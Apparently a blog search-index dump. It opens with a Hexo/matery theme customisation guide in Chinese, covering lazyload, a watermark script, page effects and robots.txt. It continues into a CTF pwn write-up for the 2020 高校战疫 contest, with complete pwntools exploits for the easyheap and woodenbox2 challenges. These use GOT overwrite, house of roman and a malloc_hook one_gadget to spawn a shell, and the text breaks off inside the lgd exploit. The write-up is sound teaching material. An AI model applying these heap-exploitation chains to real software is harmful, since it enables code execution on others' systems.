hexhttps://post.zz173.com/posts/8ddf18fb.htmlcrc32 &amp; dechttps://post.zz173.com/posts/1690090958.html\n\n生成完后，原md文件的Front-matter 内会增加abbrlink 字段，值为生成的ID 。这个字段确保了在我们修改了Front-matter 内的博客标题title或创建日期date字段之后而不会改变链接地址\n图片懒加载懒加载一般是当图片滚动进可视窗口内才加载图片，可视窗口之外的图片则不加载\n本主题图片进行懒加载，这样做效果就是 html、css、js 加载之后，图片再加载。既保证了网页的打开速度，也不会因图片的庞大体积而拖累了整个页面的加载。\n先安装插件：\nnpm install hexo-lazyload-image --save\n\n然后到博客根目录下_config.yml中加入以下字段：\n# 懒加载lazyload:  enable: true # 是否开启图片懒加载  onlypost: false # 是否只对文章的图片做懒加载  loadingImg: /images/loading.gif\n\n其中gif图的位置应该放在source/images/下\n设置文字模板Hexo的页面是包括一个md文件和ejs文件结合而成的，md文件中的内容是页面配置，基本信息，和显示的内容。而ejs文件就是js逻辑代码了。\n我们在scaffolds/post.md中设置文章的默认模板，这样以后创建文章的时候，这些信息就默认添加上了，不同文章你也可以修改这些信息。上面Front-matter已经介绍过了\n---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;author: 布莱恩特科比酱img:top:cover:coverImg:password:toc:mathjax:summary:categories:tags:---\n\n图片添加水印为了防止别人抄袭你文章，直接用你文字的图片，可以把所有的图片都加上水印。在博客根目录下新建一个watermark.py，代码如下：\n# -*- coding: utf-8 -*-import sysimport globfrom PIL import Imagefrom PIL import ImageDrawfrom PIL import ImageFontdef watermark(post_name):    if post_name == &#x27;all&#x27;:        post_name = &#x27;*&#x27;    dir_name = &#x27;source/_posts/&#x27; + post_name + &#x27;/*&#x27;    for files in glob.glob(dir_name):        im = Image.open(files)        if len(im.getbands()) &lt; 3:            im = im.convert(&#x27;RGB&#x27;)            print(files)        font = ImageFont.truetype(&#x27;STSONG.TTF&#x27;, max(30, int(im.size[1] / 20)))        draw = ImageDraw.Draw(im)        draw.text((im.size[0] / 2, im.size[1] / 2),                  u&#x27;@hiyoung&#x27;, fill=(0, 0, 0), font=font)        im.save(files)if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) == 2:        watermark(sys.argv[1])    else:        print(&#x27;[usage] &lt;input&gt;&#x27;)\n\n字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行python3 watermark.py postname添加水印，如果第一次运行要给所有文章添加水印，可以运行python3 watermark.py all\n这个代码的逻辑就是从文章目录下拿到图片，添加水印。这个前提是要文章的图片放在source&#x2F;_posts&#x2F;下，所以如果在文章中直接引用了其他地方的图片链接，那么这个脚本不会去给那个图片加水印了\n动态标签栏在theme/matery/layout/layout.ejs下添加如下代码：\n&lt;script type= &quot;text/javascript&quot; &gt;    var OriginTitile=document.title,st;    document.addEventListener(&quot;visibilitychange&quot;,function()     &#123;        document.hidden?(document.title=&quot;ヽ(●-`Д´-)ノ你要玩捉迷藏嘛&quot;,clearTimeout(st)):(document.title=&quot;(Ő∀Ő3)ノ被发现啦！&quot;,st=setTimeout(function()&#123;            document.title=OriginTitile&#125;,3e3))    &#125;)&lt;/script&gt;\n\n修改导航栏颜色以及透明效果themes/matery/source/css/matery.css文件中，有一个.bg-color属性，修改其属性值即可，代码如下：\n.bg-color &#123;    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);     //修改成自己喜欢的颜色值    opacity: 0.8;      //透明效果 值范围 0~1&#125;\n\n外链跳转插件跳转外链相关插件。自动为所有html文件中外链的a标签生成对应的属性。 比如 设置 target=&#39;_blank&#39;, rel=&#39;external nofollow noopener noreferrer&#39; 告诉搜索引擎这是外部链接,不要将该链接计入权重。 同时自动生成外链跳转页面,默认在根目录下go.html;\n安装插件：\n$ npm install hexo-external-link --save\n\n配置插件：\n在Hexo根目录的_config.yml文件中添加如下配置。\nhexo_external_link:  enable: true  enable_base64_encode: true  url_param_name: &#x27;u&#x27;  html_file_name: &#x27;go.html&#x27;  target_blank: true  link_rel: &#x27;external nofollow noopener noreferrer&#x27;  domain: &#x27;your_domain&#x27; # 如果开启了防盗链  safety_chain: true\n\n\nenable - 是否开启hexo_external_link插件 - 默认 false\nenable_base64_encode - 是否对跳转url使用base64编码 - 默认 fasle\nurl_param_name - url参数名,在跳转到外链传递给html_file_name的参数名 - 默认 ‘u’\nhtml_file_name - 跳转到外链的页面文件路径 - 默认 ‘go.html’\ntarget_blank - 是否为外链的a标签添加target=&#39;_blank&#39; - 默认 true\nlink_rel - 设置外链的a标签的rel属性 - 默认 ‘external nofollow noopener noreferrer’\ndomain - 如果开启了防盗链,除了 localhost 和 domain 之外调用会跳到主页,同时也是判断链接是否为外链的依据 - 默认 window.location.host\nsafety_chain - go.html 为了防止外链盗用 对域名进行的判断 - 默认 false\n\n添加鼠标点击烟花爆炸效果themes/matery/source/js目录下新建fireworks.js文件，打开将内容复制粘贴到fireworks.js。\n然后在themes/matery/layout/layout.ejs文件内添加以下内容：\n&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;\n\n添加樱花飘落效果在themes/matery/source/js目录下新建sakura.js文件，打开将内容复制粘贴到sakura.js。\n然后在themes/matery/layout/layout.ejs文件内添加以下内容：\n&lt;script type=&quot;text/javascript&quot;&gt;//只在桌面版网页启用特效var windowWidth = $(window).width();if (windowWidth &gt; 768) &#123;    document.write(&#x27;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;\\/script&gt;&#x27;);&#125;&lt;/script&gt;\n\n添加鼠标彩虹星星掉落跟随效果在themes/matery/source/js目录下新建cursor.js文件，打开将内容复制粘贴到cursor.js。\n然后在themes/matery/layout/layout.ejs文件内添加以下内容：\n&lt;script src=&quot;/js/snow.js&quot;&gt;&lt;/script&gt;\n\n添加雪花飘落效果在themes/matery/source/js目录下新建cursor.js文件，打开https://github.com/axh2018/script/blob/master/snow.js将内容复制粘贴到cursor.js。\n然后在themes/matery/layout/layout.ejs文件内添加以下内容：\n&lt;script src=&quot;/js/snow.js&quot;&gt;&lt;/script&gt;\n\n添加鼠标点击文字特效主题文件下的/source/js/下新建click_show_text.js，以下代码添到js中：\nvar a_idx = 0;jQuery(document).ready(function ($) &#123;    $(&quot;body&quot;).click(function (e) &#123;        var a = new Array(&quot;富强&quot;, &quot;民主&quot;, &quot;文明&quot;, &quot;和谐&quot;, &quot;自由&quot;, &quot;平等&quot;, &quot;公正&quot;, &quot;法治&quot;, &quot;爱国&quot;, &quot;敬业&quot;, &quot;诚信&quot;, &quot;友善&quot;);        var $i = $(&quot;&lt;span/&gt;&quot;).text(a[a_idx]);        a_idx = (a_idx + 1) % a.length;        var x = e.pageX,            y = e.pageY;        $i.css(&#123;            &quot;z-index&quot;: 5,            &quot;top&quot;: y - 20,            &quot;left&quot;: x,            &quot;position&quot;: &quot;absolute&quot;,            &quot;font-weight&quot;: &quot;bold&quot;,            &quot;color&quot;: &quot;#FF0000&quot;        &#125;);        $(&quot;body&quot;).append($i);        $i.animate(&#123;                &quot;top&quot;: y - 180,                &quot;opacity&quot;: 0            &#125;,            3000,            function () &#123;                $i.remove();            &#125;);    &#125;);    setTimeout(&#x27;delay()&#x27;, 2000);&#125;);function delay() &#123;    $(&quot;.buryit&quot;).removeAttr(&quot;onclick&quot;);&#125;\n\n增加建站时间只需将主题的_config.yml中的time设置为true即可：\n# Website start time.# 站点运行开始时间.time:  enable: trues  year: 2019 # 年份  month: 11 # 月份  date: 30 # 日期  hour: 17 # 小时  minute: 30 # 分钟  second: 00 # 秒\n\n添加博客天气插件去中国天气网https://cj.weather.com.cn/plugin/pc可以获取一段定制的天气代码，将这段代码添加到\n /themes/matery/layout/layout.ejs即可，例如：\n&lt;!-- my_weather天气 --&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        WIDGET = &#123;FID: &#x27;QIqG0hDUBi&#x27;&#125;    &lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;&gt;    &lt;/script&gt;\n\n添加live2d模型安装插件：\nnpm install --save hexo-helper-live2d\n\n安装模型：\nnpm install --save hexo-helper-live2d\n\n配置：\nlive2d:    enable: true    scriptFrom: local    pluginRootPath: live2dw/    pluginJsPath: lib/    pluginModelPath: assets/    tagMode: false    log: false    model:        use: live2d-widget-model-shizuku    display:        position: right        width: 150        height: 300    mobile:        show: false    react:        opacity: 0.7\n\n其中模型你可以更改，想了解更多，请移步官网https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md\n背景动态彩带只需将matery/_config.yml中canvas_nest设置为true即可：\n# 背景静止彩带.ribbon:  enable: true  size: 150 # 彩带大小, 默认: 90.  alpha: 0.6 # 彩带透明度 (0 ~ 1), 默认: 0.6.  zIndex: -1 # 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1.  clickChange: false  # 设置是否每次点击都更换彩带.\n\n背景动态线条只需将matery/_config.yml中ribbon_dynamic设置为true即可：\nribbon_dynamic:  enable: true\n\n注：加载这些样式非常耗资源\n添加反爬虫协议robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。\n我们在hexo 根目录下的 public 目录下新建一个robots.txt文件，内容如下：\nUser-agent: *Allow: /Allow: /archives/Allow: /categories/Allow: /tags/DisAllow: /about/Disallow: /friends/Disallow: /contact/Sitemap: https://axh2018.cn/sitemap.xmlSitemap: https://axh2018.cn/baidu_sitemap.xml\n\n你可自定义哪些内容可以被爬取，哪些内容不能\n参考:\n\nhttps://chinatianyunfeng.github.io/posts/63466.html#toc-heading-8\nhttps://yafine-blog.cn/posts/4ab2.html#toc-heading-55\nhttps://sunhwee.com/posts/6e8839eb.html#toc-heading-37\nhttps://github.com/blinkfox/hexo-theme-matery\n\n","categories":["env"],"tags":["hexo"]},{"title":"2020高校战疫 Pwn WP","url":"/2020/04/03/security/ctf/compitation/wp-university-campaign/","content":"2020高校战疫 Pwneasyheap难度3 &#x2F; 10\n保护Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)\n\n概述没有开启EIP,有四个功能add, delete, edit, exit.\nvulfor ( i = 0; ptr[i]; ++i );if ( i &gt; 2 )  return puts(&quot;Too many items!&quot;);ptr[i] = malloc(0x10uLL); //先开辟头部puts(&quot;How long is this message?&quot;);nbytes = inputNum();if ( nbytes &gt; 1024 ) //添加的大小大于1024时没有释放所管理的头部chunk  return puts(&quot;Too much size!&quot;);\n\n这个体的漏洞点在先进行开辟内存, 然后再比较大小.可以,若输入的大小太大, 开辟内存后直接返回\n思路我们先计算开辟的偏移, 那么我们就可以利用用这个漏洞来实现任意地址修改.然后修改free的got表, 改为puts, 然后根据传入atoi函数的got地址, 获取atoi在libc中的地址.获取取之后,通过计算偏移获取system地址, 然后修改atoi的got表为所获得的system地址, 改完之后, 添加传入’&#x2F;bin&#x2F;sh’获得shell\n堆布局# use head chunk attack to got tablep = p64(exe.got[&#x27;free&#x27;]) + p64(0x10) # 在后面申请的时候大于0x400即可利用利用该地址写入p += p64(0x0) * 2p += p64(exe.got[&#x27;atoi&#x27;]) + p64(0x10) # 作为泄漏libcp += p64(0x0) * 2p += p64(exe.got[&#x27;atoi&#x27;]) + p64(0x10) # 作为修改为system 获得shellad(0x80,  p)rm(0) # freead(0x401, &#x27;C&#x27;) #idx 0 for add headad(0x401, &#x27;C&#x27;) #idx 1 for attack free gotad(0x401, &#x27;C&#x27;) #idx 2 for puts atoi addr and for call sys\n\n泄漏libcmd(1, p64(exe.plt[&#x27;puts&#x27;])[0:6])# leaking atoi addr in libcrm(2)atoi = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)lib.address = atoi - lib.sym[&#x27;atoi&#x27;]li(&#x27;libc_base &#x27; + hex(lib.address))\n\nget shellad(0x401, &#x27;C&#x27;) # for modify atoi addr# modify atoi got as system addrmd(2, p64(lib.sym[&#x27;system&#x27;]))#get shellsl(&#x27;/bin/sh&#x27;)\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;easyheap&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;#libFile = &#x27;./libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;:&#x27;, str(1))\tsla(&#x27;?&#x27;, str(size))\tif(size &lt;= 0x400):\t\tsa(&#x27;?&#x27;, data)def rm(idx):\tsla(&#x27;:&#x27;, str(2))\tsla(&#x27;?&#x27;, str(idx))def md(idx, data):\tsla(&#x27;:&#x27;, str(3))\tsla(&#x27;?&#x27;, str(idx))\tsa(&#x27;?&#x27;, data)def dp(idx):\tsla(&#x27;:&#x27;, str(4))\tsla(&#x27;:&#x27;, str(idx))def q():\tsla(&#x27;:&#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\t# use head chunk attack to got table\tp = p64(exe.got[&#x27;free&#x27;]) + p64(0x10)\tp += p64(0x0) * 2\tp += p64(exe.got[&#x27;atoi&#x27;]) + p64(0x10)\tp += p64(0x0) * 2\tp += p64(exe.got[&#x27;atoi&#x27;]) + p64(0x10)\tad(0x80,  p)\trm(0) # free\tad(0x401, &#x27;C&#x27;) #idx 0 for add head\tad(0x401, &#x27;C&#x27;) #idx 1 for attack free got\tad(0x401, &#x27;C&#x27;) #idx 2 for puts atoi addr and for call sys\tmd(1, p64(exe.plt[&#x27;puts&#x27;])[0:6])\t# leaking atoi addr in libc\trm(2)\tatoi = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tlib.address = atoi - lib.sym[&#x27;atoi&#x27;]\tli(&#x27;libc_base &#x27; + hex(lib.address))\tad(0x401, &#x27;C&#x27;) # for modify atoi addr\t# modify atoi got as system addr\tmd(2, p64(lib.sym[&#x27;system&#x27;]))\t#get shell\tsl(&#x27;/bin/sh&#x27;)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\nexp2#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;easyheap&quot;libFile  = &quot;libc.so.6&quot;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIBC  = 1r   =  lambda   : io.recv()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, text):\tsa(&#x27;:&#x27;, str(1))\tsa(&#x27;?&#x27;, str(size))\tif(size &gt; 0x400):\t\treturn\tsa(&#x27;?&#x27;, text)def rm(index):\tsa(&#x27;:&#x27;, str(2))\tsa(&#x27;?&#x27;, str(index))def md(index, text):\tsa(&#x27;:&#x27;, str(3))\tsa(&#x27;?&#x27;, str(index))\tsa(&#x27;?&#x27;, text)def q():\tsa(&#x27;:&#x27;, str(4))#--------------------------Exploit--------------------------def exploit():\tpl = p64(exe.got[&#x27;free&#x27;]) + p64(0x400) + b&#x27;a&#x27; * 0x10 + p64(exe.got[&#x27;atoi&#x27;])\tad(0x400, pl) #Add got addr to change it and get atoi addr in libc\trm(0)\tad(0x401, &#x27;&#x27;) #malloc to first ad item\tad(0x401, &#x27;&#x27;)\tad(0x401, &#x27;&#x27;)\tmd(1, p64(exe.plt[&#x27;puts&#x27;])) #modify free got addr as puts plt addr\trm(2) #to print the got addr atoi func and dec num\trl()\tatoi_addr = u64(rl()[0:6] + &#x27;\\x00\\x00&#x27;)\tsys_addr = atoi_addr + lib.sym[&#x27;system&#x27;] - lib.sym[&#x27;atoi&#x27;] #get addr in libc\tli(&#x27;sys addr:&#x27; + hex(sys_addr))\tmd(1, p64(sys_addr)) #modify free got addr as system addr\tad(0x16, &#x27;/bin/sh&#x27;)  #set system parameter\trm(2) #exec systemdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIBC:\t\t\tlib = ELF(libFile)\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\telse:\t\tio = remote(remoteIp, remotePort)\t\tif LIBC:\t\t\tlib = ELF(libFile)\texploit()\tfinish()\n\n\n\nwoodenbox2难度5 &#x2F; 10\n保护Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\nvulif ( qword_2020A8[2 * v2] )&#123;  printf(&quot;Please enter the length of item name:&quot;, &amp;buf);  read(0, &amp;nptr, 8uLL);  size = atoi(&amp;nptr);  printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);  v3 = read(0, qword_2020A8[2 * v2], size); // 大小没有进行检查, 堆溢出  if ( *((_BYTE *)qword_2020A8[2 * v2] + v3 - 1) == 10 )    *((_BYTE *)qword_2020A8[2 * v2] + v3 - 1) = 0;  *((_DWORD *)&amp;itemlist + 4 * v2) = strlen((const char *)qword_2020A8[2 * v2]);&#125;\n\n概述保护全开, 只有四个功能, 添加, 修改, 删除,退出. 退出时有连续释放内存, double free, 是一个典型的house of roman题. 注意的是, 在释放后, 储存指针的数组中的值会往前移动一位.\n思路采用 unsorted bin attack 与 fastbin attack 结合打入IO_2_1_stderr进行泄漏出libc,然后再次利用fastbin attack打入malloc_hook进行one_gadget\n利用堆布局ad(0x68, &#x27;0&#x27; * 0x68) # c0 i0 用于堆溢出修改chunk 1为 unsorted binad(0x68, &#x27;1&#x27; * 0x68) # c1 i1 用来进行fake chunk变成 unsoted bin 分割堆块到 chunk2ad(0x68, &#x27;2&#x27; * 0x68) # c2 i2 用来进行fastbin attack 的chunkad(0x68, &#x27;3&#x27; * 0x68) # c3 i3 防止堆合并\n\n打入IO_2_1_stderrmd(0, 0x70, &#x27;0&#x27; * 0x68 + p64(0xe1)) # 修改chunk 1 为 unsoted binrm(1) # 释放 chunk 1rm(1) # 释放 chunk 2 用于后面的fastbin attack# 分割unsoted bin chunk 1堆块使 main_arena 信息跑到 chunk 2中ad(0x38, &#x27;6&#x27; * 0x38) # c4 i3 in chunk 1ad(0x28, &#x27;6&#x27; * 0x28) # c5 i4 in chunk 1      # 通过堆溢出修改chunk 2中的fd为 _IO_2_1_stderr_+157, 几率为 1/16md(2, 0x32, &#x27;5&#x27; * 0x28 + p64(0x71) + &#x27;\\xdd\\x25&#x27;) # c5   ad(0x68, &#x27;\\x00&#x27; * 0x68) # for ajust\n\n泄漏libc# 修改_IO_2_1_stderr_结构体泄漏出地址   ad(0x68, &#x27;\\x00&#x27; * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0))libc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)libc_base -= lib.sym[&#x27;_IO_2_1_stderr_&#x27;] + 192lib.address = libc_baseli(&#x27;libc_base &#x27; + hex(libc_base)) __malloc_hook = lib.sym[&#x27;__malloc_hook&#x27;]realloc = lib.sym[&#x27;realloc&#x27;]li(&#x27;__malloc_hook &#x27; + hex(__malloc_hook)) gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = lib.address + gadget[1]\n\n打入malloc_hookrm(3) #释放掉 chunk 2   #继续使用堆溢出修改chunk 2,再次采用fastbin attack 打入malloc_hook - 0x23处md(1, 0x38, &#x27;5&#x27; * 0x28 + p64(0x71) + p64(__malloc_hook - 0x23)) ad(0x68, &#x27;\\n&#x27;) #调整   #修改realloc_hook为one_gadget, malloc_hook为realloc_hook调整rspad(0x68, &#x27;\\x00&#x27; * (0x13 - 0x8) + p64(one_gadget) + p64(realloc))\n\ngetshell#get shellsl(&#x27;1&#x27;)sl(&#x27;1&#x27;)\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;./woodenbox2&quot;#libFile  = &quot;./libc.so.6&quot;libFile  = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, text):\tsla(&#x27;Your choice:&#x27;, str(1))\tsla(&#x27;name:&#x27;, str(size))\tsa(&#x27;item:&#x27;, text)def md(idx, size, text):\tsla(&#x27;Your choice:&#x27;, str(2))\tsla(&#x27;item:&#x27;, str(idx))\tsla(&#x27;name:&#x27;, str(size))\tsa(&#x27;item:&#x27;, text)def rm(idx):\tsla(&#x27;Your choice:&#x27;, str(3))\tsla(&#x27;item:&#x27;, str(idx))def q():\tsla(&#x27;Your choice:&#x27;, str(4))#--------------------------Exploit--------------------------def exploit():\t# notice: free() then idx forword 1\tad(0x68, &#x27;0&#x27; * 0x68) # c0 i0\tad(0x68, &#x27;1&#x27; * 0x68) # c1 i1\tad(0x68, &#x27;2&#x27; * 0x68) # c2 i2\tad(0x68, &#x27;3&#x27; * 0x68) # c3 i3\tmd(0, 0x70, &#x27;0&#x27; * 0x68 + p64(0xe1))\trm(1)\trm(1) # chunk 2\t#split chunk 1 as two, then main_arena to chunk 2\tad(0x38, &#x27;6&#x27; * 0x38) # c4 i3 in chunk 1\tad(0x28, &#x27;6&#x27; * 0x28) # c5 i4 in chunk 1\t# leaking\t# _IO_2_1_stderr_+157 for fastbin attack\tmd(2, 0x32, &#x27;5&#x27; * 0x28 + p64(0x71) + &#x27;\\xdd\\x25&#x27;) # c5\tad(0x68, &#x27;\\x00&#x27; * 0x68) # for ajust\t#                            0xfbad1800\tad(0x68, &#x27;\\x00&#x27; * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0))\tlibc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base -= lib.sym[&#x27;_IO_2_1_stderr_&#x27;] + 192\tlib.address = libc_base\tli(&#x27;libc_base &#x27; + hex(libc_base)) \t__malloc_hook = lib.sym[&#x27;__malloc_hook&#x27;]\trealloc = lib.sym[&#x27;realloc&#x27;]\tli(&#x27;__malloc_hook &#x27; + hex(__malloc_hook)) \tgadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\tone_gadget = lib.address + gadget[1]\t#md(3, 4, &#x27;AAAA&#x27;)\trm(3) #rm chunk 2\tmd(1, 0x38, &#x27;5&#x27; * 0x28 + p64(0x71) + p64(__malloc_hook - 0x23))\tad(0x68, &#x27;\\n&#x27;)\tad(0x68, &#x27;\\x00&#x27; * (0x13 - 0x8) + p64(one_gadget) + p64(realloc))\t#get shell\tsl(&#x27;1&#x27;)\tsl(&#x27;1&#x27;)\t#db()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:[rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:[rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:[rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n\n\n\n\ngld难度6 &#x2F; 10\n保护     Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)     logan@LYXF:~/share/lgd$ seccomp-tools dump ./lgd line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x06 0x00 0x00 0x00000000  return KILL\n\n简单描述有5个功能, 添加, 删除, 打印, 修改, 退出.没有开启EIP, 通过检查seccomp-tools检查, 开启了沙箱,不能get shell方式获取flag, 开了一个BCF(虚假控制流)\nvulsub_400896(dword_603010, dword_60303C + 1, dword_603040);  &#125;  size = snprintf(byte_6033E0, size, &quot;%s&quot;, &amp;unk_603060);//vul: 通过字符长度来重新设置大小  if ( dword_60303C / dword_603010 &gt; 1 )  &#123;    if ( dword_60303C % dword_603010 )    &#123;      if ( dword_60303C % dword_603010 != dword_60303C / dword_603010 || dword_603040 )      &#123;        if ( dword_60303C % dword_603010 &lt;= 1 || dword_60303C % dword_603010 &gt;= dword_60303C / dword_603010 )\n\n若输入的字符长度大于所输入的大小,造成堆溢出.\n知识点unsorted bin split, unlink attack, environ, seccomp, rop\n思路通过unsoted bin 分割堆块溢出libc基址, 使用unsoted bin taack 打入指针数组, 泄漏environ中的stack地址, 劫持修改功能的ret栈地址, 由于开了沙箱, 那就只能通过open, read, puts来获取方式来打印flag了.\n利用堆布局sla(&#x27;name?&#x27;, &#x27;I0gan&#x27;)ad(0x68, &#x27;A&#x27; * 0x100) # idx 0 通过溢出修改chunk 1为 small binad(0x68, &#x27;A&#x27; * 0x78) # idx 1 为了分割unsoted bin,使 main_arena 到 chunk 2中ad(0x68, &#x27;A&#x27; * 0x78) # idx 2 为了打印 main_arenaad(0x68, &#x27;A&#x27; * 0x78) # idx 3 不让top chunk 合并, 其实不用也行\n\n获取libcp = &#x27;A&#x27; * 0x60p += p64(0)p += p64(0xe1)md(0, p) # 修改 chunk 1为small bin然后释放rm(1)ad(0x68, &#x27;A&#x27; * 0x78) #分割 chunk 1 (unsoted bin)使main_arena 跑到 chunk 2中dp(2) # 打印main_arena + 88处地址lib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + 